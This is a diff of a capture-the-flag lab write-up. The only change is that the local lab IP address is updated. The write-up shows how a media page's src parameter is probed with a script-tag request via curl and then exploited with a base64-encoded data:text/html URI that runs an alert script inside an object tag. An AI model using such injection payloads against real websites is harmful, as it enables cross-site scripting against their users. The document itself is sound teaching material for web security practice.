@@ -1,17 +1,17 @@
 # NSA page
 
-__http://192.168.99.101/index.php?page=media&src=nsa__
+__http://192.168.56.101/index.php?page=media&src=nsa__
 
 ## Description
 We see eagle on the page. However if we change nsa in the end of the url we get the following.
 
 ```
-http://192.168.99.101/index.php?page=media&src=blabla
+http://192.168.56.101/index.php?page=media&src=blabla
 ```
 we get no found.
 The tag ```src``` is the attribute of ```<object>```
 For example let's link to the picture.
-```http://192.168.99.101/?page=media&src=/images/42.jpeg```
+```http://192.168.56.101/?page=media&src=/images/42.jpeg```
 We see that the javascript works incorrect.
 For page ```curl -s '192.168.99.101/?page=media&src=<script>alert(1)</script>' | grep 'object'```
 We see page source ```<table style="margin-top:-68px;"><center><h2 style="margin-top:50px;"></h2><br/><img src="images/WrongAnswer.gif" alt=""></center> <tr style="background-color:transparent;border:none;"><td style="vertical-align:middle;"><object data="&lt;script&gt;alert(1)&lt;/script&gt;"></object></td></tr></table>				</div>```
@@ -32,7 +32,7 @@ The output is ```PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==```
 ## Flag
 So try to input the request to the browser
 ```
-http://192.168.99.101/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+http://192.168.56.101/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
 ```
 And we get the next flag.
 
